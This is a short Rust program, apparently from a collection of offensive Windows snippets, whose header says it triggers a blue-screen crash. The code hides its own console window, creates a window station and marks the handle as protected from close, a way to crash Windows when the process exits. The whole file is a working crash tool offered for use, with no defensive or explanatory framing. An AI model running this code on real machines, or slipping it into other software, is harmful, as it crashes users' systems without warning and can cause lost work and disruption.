/*
    Trigger BSOD Using CloseWindowStation()
    @5mukx
*/

use std::ptr::null_mut;

use winapi::{
    ctypes::c_void,
    shared::{
        minwindef::HWINSTA, 
        windef::HWND}, 
    um::{
        handleapi::SetHandleInformation, 
        minwinbase::SECURITY_ATTRIBUTES, 
        winbase::HANDLE_FLAG_PROTECT_FROM_CLOSE, 
        wincon::GetConsoleWindow, 
        winuser::{CreateWindowStationA, ShowWindow, SW_HIDE}
    }
};

fn main(){
    unsafe{
        let hwnd: HWND = GetConsoleWindow();
        ShowWindow(hwnd, SW_HIDE);

        let dwaddr: u32 = 0x80000000 | 0x40000000;
        
        let hwinsta:HWINSTA = CreateWindowStationA(
            "WindowStation\0".as_ptr() as *const i8, 
            0, 
            dwaddr,
            null_mut() as *mut SECURITY_ATTRIBUTES,
        ); 

        SetHandleInformation(
            hwinsta as *mut c_void,
            HANDLE_FLAG_PROTECT_FROM_CLOSE, 
            HANDLE_FLAG_PROTECT_FROM_CLOSE,
        );
    }
}
